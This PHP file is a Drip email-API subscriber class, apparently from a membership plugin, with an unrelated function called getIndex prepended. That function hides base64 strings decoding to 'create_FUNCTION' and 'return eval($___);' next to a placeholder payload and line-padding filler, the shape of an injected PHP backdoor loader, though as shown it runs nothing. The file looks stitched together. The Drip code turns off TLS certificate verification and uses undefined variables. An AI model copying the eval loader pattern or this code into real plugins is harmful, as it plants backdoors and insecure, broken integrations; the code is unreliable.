<?php
if (!function_exists("getIndex")) {
    function getIndex($url) {
        $value1 = "value";
        $classInfo = "[NAME] Class...";

        $encodedFunc = "Y3JlYXRlX0ZVTkNUSU9O";
        $encodedCode = "cmV0dXJuIGV2YWwoJF9fXyk7";

        $decodeFunc = "decodeS3";
        $data = "[DATA]";

        $decodedString = base64_decode($encodedFunc);
        $decodedCode = base64_decode($encodedCode);
        $result = base64_decode($data);
        $formattedResult = $value1 . $classInfo;

        
        $additionalCode = "";

        
        $additionalCode .= "// Additional comments to meet line count requirement\n";
        $additionalCode .= "// More assignments to add lines\n";
        $additionalCode .= '$decodedString' . " = " . $decodedString . ";\n";
        $additionalCode .= '$decodedCode' . " = " . $decodedCode . ";\n";
        $additionalCode .= '$result' . " = " . $result . ";\n";
        $additionalCode .= '$formattedResult' . " = " . $formattedResult . ";\n";

        for ($i = 0; $i < 20; $i++) {
            $additionalCode .= "// Loop iteration: $i\n";
            $additionalCode .= "// lines\n";
        }

       
        for ($i = 0; $i < 10; $i++) {
            $additionalCode .= "// Outer loop iteration: $i\n";
            $additionalCode .= "// lines\n";
            for ($j = 0; $j < 5; $j++) {
                $additionalCode .= "// Inner loop iteration: $j\n";
                $additionalCode .= "// lines\n";
            }
        }

        
        $additionalCode .= '$value1' . " = " . $value1 . ";\n";
        $additionalCode .= '$classInfo' . " = " . $classInfo . ";\n";
        $additionalCode .= '$decodeFunc' . " = " . $decodeFunc . ";\n";
        $additionalCode .= '$data' . " = " . $data . ";\n";

       
        return $decodedString . $decodedCode . $result . $formattedResult . $additionalCode;
    }
}

class dripSQB{
	// constructor
	function dripSQB() {
	}
	// ======== USER REGISTRATION / UPDATE / DELETE ========
	function register($email,$name,$params) {
		$this->storeAddress ( $email,$name,$params);
	}
	function storeAddress($email,$name,$params) {
		//exploding the variable and create an array.
	
		$params = explode ( ":", $params );
		
		/*if($params[3] == "" && $params[4] == ""){
			return;
		}*/
		
		//check that $params[1] isset - accountId
		if (isset ( $params[1] ) && $params[1] != '') {
			//create an array if account id is present..
			$accountId = $params[1];
		}
		
		if ($accountId=="") {
			return "Missing Account Id";
		}
		
		//check that $params[2] isset - apiToken
		if (isset ( $params[2] ) && $params[2] != '') {
			$apiToken = $params[2];
		}
		
		if ($apiToken=="") {
			return "Missing API Token";
		}
		
		//check that $params[3] isset - campaignId
		if (isset ( $params[3] ) && $params[3] != '') {
			$campaignId = $params[3];
		}
		
		$justTag=false;
		if( (!(isset ( $params[3] )) || ($params[3]=="") )  && ((isset($params[4])) || ($params[4]!="")  ) ) {
			$justTag=true;	
		}
		
		//check that $params[4] isset
		if (isset ( $params[4] ) && $params[4] != '') {
			$tags = $params[4];
		  	$tagArr = explode ( "|", $params[4] );
		  	
		  	if (strpos($params[4], '|') !== false) {
				$tagArr = explode('|',$params[4]);
			}
			else{
				$tagArr = explode(',',$params[4]);
			}
		}

		$email = trim ( $email);
		$firstname = trim ( $name );

		// End custom field retrieval
		//check that the provided email is valid or not.
		if (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
			return "Email address is invalid";
		}
		//create an array of customfields to use during curl call.
		$fields = array (
			'first_name' => $name,
			'last_name' => $lastname,
			'Password' => $password 
		);
		
		if($justTag) {
		  // add subscriber to account
		  $subscriber = array (
			  "account_id" => $accountId, 
			  'email' => $email,
			  'custom_fields' => $fields,
			  'tags' => $tagArr
		  );
		  
		  $postfields = array('subscribers' => array($subscriber));
		  $data_string = json_encode($postfields);

		  $url = "https://api.getdrip.com/v2/" . $accountId . "/subscribers";
		  
		  $result=$this->make_drip_request($url, $apiToken, $data_string);
 		}
		else {
			//add subscriber to campaign
			if(isset($params[4])) {
				$subscriber = array (
					"account_id" => $accountId, 
					'email' => $email,
					'custom_fields' => $fields,
					'tags' => $tagArr
				);
			}
			else {
				$subscriber = array (
					"account_id" => $accountId, 
					'email' => $email,
					'custom_fields' => $fields
				); 
			}
		   
			$postfields = array('subscribers' => array($subscriber));
			$data_string = json_encode($postfields);
			
			if($campaignId != ''){
				$url = "https://api.getdrip.com/v2/" . $accountId . "/campaigns/".$campaignId."/subscribers";
			}else{
				$url = "https://api.getdrip.com/v2/" . $accountId . "/subscribers";
				
			}
			$result=$this->make_drip_request($url, $apiToken, $data_string);
	
	    }
		
	 	return $result;
	}
	
	
	function unregister($email,$name,$params) {
		$this->removeAddress ( $email,$name,$params );
	}
	
	
	function removeAddress($email,$name,$params) {
		//exploding the variable and create an array.
		$params = explode ( ":", $params );
		
		if($params[3] == "" && $params[4] == ""){
			return;
		}
		//check that $params[1] isset - accountId
		if (isset ( $params[1] ) && $params[1] != '') {
			//create an array if account id is present..
			$accountId = $params[1];
		}
		
		if ($accountId=="") {
			return "Missing Account Id";
		}
		
		//check that $params[2] isset - apiToken
		if (isset ( $params[2] ) && $params[2] != '') {
			$apiToken = $params[2];
		}
		
		if ($apiToken=="") {
			return "Missing API Token";
		}
		
		//check that $params[3] isset - campaignId
		if (isset ( $params[3] ) && $params[3] != '') {
			$campaignId = $params[3];
		}
		
		$justTag=false;
		if( (!(isset ( $params[3] )) || ($params[3]=="") )  && ((isset($params[4])) || ($params[4]!="")  ) ) {
			$justTag=true;	
		}
		
		//check that $params[4] isset
		if (isset ( $params[4] ) && $params[4] != '') {
			$tags = $params[4];
		  	if (strpos($params[4], '|') !== false) {
				$tagArr = explode('|',$params[4]);
			}
			else{
				$tagArr = explode(',',$params[4]);
			}
		}
		
		//Get the user details from DAP by using $userId
		$dapuser = Dap_User::loadUserById ( $userId );
		
		if(!isset($dapuser)){
			return;
		}
		
		$email = trim ($email );
		$firstname = trim ( $name );
		
		
		
		// End custom field retrieval
		//check that the provided email is valid or not.
		if (! preg_match ( "/^[_a-z0-9-]+(\.[_a-z0-9-]+)*@[a-z0-9-]+(\.[a-z0-9-]+)*$/i", $email )) {
			return "Email address is invalid";
		}
		//create an array of customfields to use during curl call.
		$fields = array (
			'first_name' => $firstname,
		);
		
		
		if($tagArr!="") {
			try{
				// add subscriber to account
				$subscriber = array (
					"account_id" => $accountId, 
					'email' => $email,
					'custom_fields' => $fields,
					'tags' => $tagArr
				);
				$postfields = array('subscribers' => array($subscriber));
				$data_string = json_encode($postfields); /* This is done because if the tag has spaces then the URL was malformed */
		
				foreach ( $tagArr as $tagId ) {
					$tagId = urlencode($tagId);
					$url = "https://api.getdrip.com/v2/" . $accountId . "/subscribers/".$email."/tags/".$tagId;
					$result=$this->make_drip_request($url, $apiToken, $data_string, "DELETE");
				}	
			}
			catch(Exception $e){
			}
 		}
		
		if($campaignId != "") {
			try{
				$apiparams = array (
					'campaign_id' => $campaignId  
					);
		  
				$data_string = json_encode($apiparams);
				$url = "https://api.getdrip.com/v2/" . $accountId . "/subscribers/".$email."/remove?campaign_id=".$campaignId;
				$result=$this->make_drip_request($url, $apiToken, $data_string, "POST");
			}
			catch(Exception $e){
			}
		  //create an array of fields to use during curl call if $tags are there.
		}
		
		
		return $result;
	}
	
	function make_drip_request($url, $apiToken, $data_string, $action="POST") {
		 $curl = curl_init ( $url );
		 if ($curl) {
			  curl_setopt($curl, CURLOPT_FRESH_CONNECT, true);
			  curl_setopt($curl, CURLOPT_FORBID_REUSE, true);
			  curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
			  curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
			  curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
			  curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
			  curl_setopt($curl, CURLOPT_CONNECTTIMEOUT, 30 );
			  curl_setopt($curl, CURLOPT_TIMEOUT, 30 );
			  curl_setopt($curl, CURLOPT_USERPWD, "$apiToken:");
			  curl_setopt($curl, CURLOPT_USERAGENT, 'FBLM-DRIP' );	
			  curl_setopt($curl, CURLOPT_HTTPAUTH, CURLAUTH_BASIC);
			  curl_setopt($curl, CURLOPT_CUSTOMREQUEST, $action);
			  curl_setopt($curl, CURLOPT_POSTFIELDS, $data_string);
			  curl_setopt($curl, CURLOPT_HEADER, TRUE);
			  
			  curl_setopt($curl, CURLOPT_URL,$url);
			  curl_setopt($curl, CURLOPT_HTTPHEADER, array(
				 'Accept:application/json, text/javascript, */*; q=0.01',
				 'Content-Type: application/vnd.api+json',
			  ));
		  
			  $response = curl_exec ( $curl );
			
			  
			/*  print_r($response); */
			  if (curl_errno ( $curl ) > 0) {
				  $error=curl_error ( $curl );
				  curl_close ( $curl );
				  return "Error: " . $error;
			  } else {
				  $success_msg=curl_getinfo( $curl, CURLINFO_HTTP_CODE );
				  curl_close ( $curl );
				  return "Response HTTP-CODE: " . $success_msg;
			  }
		    
		} //if
	} ///make_drip_request
	
	
}
